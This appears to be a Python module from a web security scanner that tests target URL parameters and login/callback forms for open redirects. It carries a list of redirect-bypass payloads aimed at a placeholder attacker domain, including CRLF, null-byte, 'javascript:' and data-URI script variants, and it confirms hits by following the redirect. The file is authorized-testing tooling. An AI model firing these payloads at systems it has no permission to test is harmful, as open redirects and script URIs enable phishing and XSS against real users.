#!/usr/bin/env python3
"""
Open Redirect Detection (V10.3 Precision) — Detecta redirecionamentos abertos.
Valida bypasses modernos, confirma o redirecionamento real com double-check,
e testa POST forms quando possível.
V10.3: httpx.Client reuse, dedup de resultados.
"""
import json
import time
import httpx
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY, DEFAULT_TIMEOUT, get_user_agent
from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

EVIL_DOMAIN = "evil-enum-allma.com"

# V10.4: Lista de domínios de confirmação em ordem de prioridade
# O OAST URL (se disponível no context) é preferido para confirmação real
def _get_redirect_target(context: dict) -> str:
    """Retorna URL de confirmação: OAST se disponível, senão evil domain."""
    oast_url = context.get("oast_url", "")
    if oast_url:
        return oast_url
    return f"https://{EVIL_DOMAIN}/redirect"

# Payloads Modernos V10.1
REDIRECT_PAYLOADS = [
    f"//{EVIL_DOMAIN}",
    f"https://{EVIL_DOMAIN}",
    f"@{EVIL_DOMAIN}", # @ bypass
    f"/\\{EVIL_DOMAIN}", # backslash bypass
    f"//google.com@{EVIL_DOMAIN}",
    f"javascript:alert(1)//@{EVIL_DOMAIN}",
    f"/%2f{EVIL_DOMAIN}",
    f"\\{EVIL_DOMAIN}",
]

# V10.2: Payloads adicionais de bypass moderno
REDIRECT_PAYLOADS_V10_2 = [
    f"//{EVIL_DOMAIN}/%2f%2f",             # Double-encoded slash
    f"https://{EVIL_DOMAIN}%00.legit.com", # Null byte bypass
    f"https://{EVIL_DOMAIN}%0d%0a",        # CRLF in redirect
    f"///{EVIL_DOMAIN}",                    # Triple slash
    f"https://legit.com@{EVIL_DOMAIN}",    # Credential-style bypass
    f"/{EVIL_DOMAIN}",                      # Path confusion
    f"data:text/html,<script>window.location='https://{EVIL_DOMAIN}'</script>",  # Data URI
    f"https://{EVIL_DOMAIN}#",             # Fragment bypass
    f"https:{EVIL_DOMAIN}",                # Missing slashes
]

# Parâmetros comuns de redirecionamento para POST testing (V10.2)
REDIRECT_PARAM_NAMES = [
    "url", "redirect", "redirect_url", "redirect_uri", "return", "return_url",
    "returnTo", "next", "goto", "destination", "target", "rurl", "continue",
    "forward", "callback", "path", "out", "view", "login", "link",
]

def _test_redirect(client: httpx.Client, url: str, param: str) -> list:
    """Testa Open Redirect com double-check de validação externa. Reutiliza sessão."""
    findings = []
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    # Combinar payloads V10.1 + V10.2
    all_payloads = REDIRECT_PAYLOADS + REDIRECT_PAYLOADS_V10_2

    for payload in all_payloads:
        time.sleep(REQUEST_DELAY)
        test_qs = qs.copy()
        test_qs[param] = [payload]
        new_query = urlencode(test_qs, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

        try:
            resp = client.get(test_url, headers={"User-Agent": DEFAULT_USER_AGENT})
            location = resp.headers.get("location", "")
            
            # Fase 1: Detectar 3xx + Location contendo o payload
            if resp.status_code in [301, 302, 303, 307, 308]:
                is_javascript = payload.startswith(("javascript:", "data:")) and location.lower().startswith(("javascript:", "data:"))
                
                if EVIL_DOMAIN in location or is_javascript:
                    # Fase 2: Double-Check Cirúrgico V10.1
                    if is_javascript:
                        findings.append({
                            "url": url,
                            "type": "OPEN_REDIRECT",
                            "risk": "HIGH",
                            "method": "GET",
                            "parameter": param,
                            "details": f"XSS via Redirect Confirmado: Parâmetro '{param}' retornou URI '{location}'",
                            "payload": payload,
                            "status": resp.status_code,
                            "request_raw": format_http_request(resp.request),
                            "response_raw": format_http_response(resp),
                        })
                        break # Um payload com sucesso basta por parâmetro
                    else:
                        final_loc = location if location.startswith("http") else urlunparse((parsed.scheme, parsed.netloc, location, "", "", ""))
                        try:
                            resp2 = client.get(final_loc, headers={"User-Agent": DEFAULT_USER_AGENT}, follow_redirects=True)
                            final_url = str(resp2.url)
                            
                            # STRICT CHECK: Ensure we actually landed on the evil domain (no soft query parameter reflections)
                            if urlparse(final_url).netloc == EVIL_DOMAIN:
                                findings.append({
                                    "url": url,
                                    "type": "OPEN_REDIRECT",
                                    "risk": "HIGH",
                                    "method": "GET",
                                    "parameter": param,
                                    "details": f"Redirecionamento Confirmado: Parâmetro '{param}' enviou o navegador para {final_url}",
                                    "payload": payload,
                                    "status": resp.status_code,
                                    "request_raw": format_http_request(resp.request),
                                    "response_raw": format_http_response(resp),
                                })
                                break # Um payload com sucesso basta por parâmetro
                        except: pass
        except Exception:
            pass
    return findings


def _test_redirect_post(client: httpx.Client, url: str) -> list:
    """V10.2: Testa Open Redirect via POST em formulários com parâmetros de redirecionamento. Reutiliza sessão."""
    findings = []
    parsed = urlparse(url)
    
    for param in REDIRECT_PARAM_NAMES:
        for payload in REDIRECT_PAYLOADS[:4]:  # Usar subset para não sobrecarregar
            time.sleep(REQUEST_DELAY)
            try:
                data = {param: payload}
                resp = client.post(url, data=data, headers={"User-Agent": DEFAULT_USER_AGENT})
                location = resp.headers.get("location", "")
                
                if resp.status_code in [301, 302, 303, 307, 308]:
                    is_javascript = payload.startswith(("javascript:", "data:")) and location.lower().startswith(("javascript:", "data:"))
                    
                    if EVIL_DOMAIN in location or is_javascript:
                        if is_javascript:
                            findings.append({
                                "url": url,
                                "type": "OPEN_REDIRECT",
                                "risk": "HIGH",
                                "method": "POST",
                                "parameter": param,
                                "details": f"XSS via Redirect POST Confirmado: Retornou URI '{location}'",
                                "payload": payload,
                                "status": resp.status_code,
                                "request_raw": format_http_request(resp.request),
                                "response_raw": format_http_response(resp),
                            })
                            return findings
                        else:
                            # Confirmar com follow
                            final_loc = location if location.startswith("http") else urlunparse((parsed.scheme, parsed.netloc, location, "", "", ""))
                            try:
                                resp2 = client.get(final_loc, headers={"User-Agent": DEFAULT_USER_AGENT}, follow_redirects=True)
                                final_url = str(resp2.url)
                                if urlparse(final_url).netloc == EVIL_DOMAIN:
                                    findings.append({
                                        "url": url,
                                        "type": "OPEN_REDIRECT",
                                        "risk": "HIGH",
                                        "method": "POST",
                                        "parameter": param,
                                        "details": f"Redirecionamento POST Confirmado: Parâmetro '{param}' redirecionou para {final_url}",
                                        "payload": payload,
                                        "status": resp.status_code,
                                        "request_raw": format_http_request(resp.request),
                                        "response_raw": format_http_response(resp),
                                    })
                                    return findings  # Um achado por URL basta
                            except: pass
            except Exception:
                pass
    return findings


def run(context: dict):
    """Executa o scan de open redirect."""
    import httpx
    from core.config import DEFAULT_USER_AGENT, DEFAULT_TIMEOUT, REQUEST_DELAY

    target = context.get("target")
    stealth = context.get("stealth", False)
    deep = context.get("deep", False)
    if not target:
        raise ValueError("Target required")

    info(f"🧪 {C.BOLD}{C.CYAN}OPEN REDIRECT SCANNER (V10.4 PRECISION){C.END}")
    outdir = ensure_outdir(target, "open_redirect")

    # V10.4: URL de confirmação (OAST ou evil domain)
    redirect_target = _get_redirect_target(context)
    redirect_domain = redirect_target.split("//")[-1].split("/")[0]  # Extrai domínio

    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    candidates = []
    if urls_file.exists():
        urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
        for u in urls:
            if "?" in u:
                p = urlparse(u)
                qs = parse_qs(p.query)
                for param in qs:
                    candidates.append((u, param))
    
    # V10.3: Dedup por (normalized_url, param)
    seen = set()
    deduped = []
    for url, param in candidates:
        key = (url.rstrip("/"), param)
        if key not in seen:
            seen.add(key)
            deduped.append((url, param))
    
    candidates = deduped[:80]
    # V11: Reduzir workers para thread-safety com httpx.Client compartilhado
    max_workers = 3 if stealth else 5
    
    results = []
    found_keys = set()  # V10.3: Dedup resultados
    
    # V10.3: Uma única sessão httpx para todos os testes
    with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False, follow_redirects=False) as client:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(_test_redirect, client, url, param): (url, param) for url, param in candidates}
            for future in as_completed(futures):
                res = future.result()
                if res:
                    for f in res:
                        dedup_key = (f["url"], f.get("parameter", ""))
                        if dedup_key not in found_keys:
                            found_keys.add(dedup_key)
                            results.append(f)
                            info(f"   🔴 {C.RED}[OPEN REDIRECT]{C.END} Confirmado em {f['url']} via '{f['payload']}'")

        # V10.2: Teste POST em endpoints com padrão de formulário (somente em deep mode)
        if deep:
            info(f"   🔎 [DEEP] Testando Open Redirect via POST...")
            post_candidates = []
            if urls_file.exists():
                urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
                post_candidates = [u for u in urls if any(kw in u.lower() for kw in ["/login", "/auth", "/redirect", "/callback", "/return", "/sso"])]
            
            post_candidates = list(set(u.rstrip("/") for u in post_candidates))[:20]
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {executor.submit(_test_redirect_post, client, url): url for url in post_candidates}
                for future in as_completed(futures):
                    res = future.result()
                    if res:
                        for f in res:
                            dedup_key = (f["url"], f.get("parameter", ""))
                            if dedup_key not in found_keys:
                                found_keys.add(dedup_key)
                                results.append(f)
                                info(f"   🔴 {C.RED}[OPEN REDIRECT POST]{C.END} Confirmado em {f['url']}")

    output_file = outdir / "open_redirect_results.json"
    output_file.write_text(json.dumps(results, indent=2))
    
    # V10.3: Summary
    summary = {"urls_tested": len(candidates), "findings": len(results), "status": "COMPLETED"}
    (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))
    
    success(f"   📂 Resultados salvos em {output_file}")
    return results
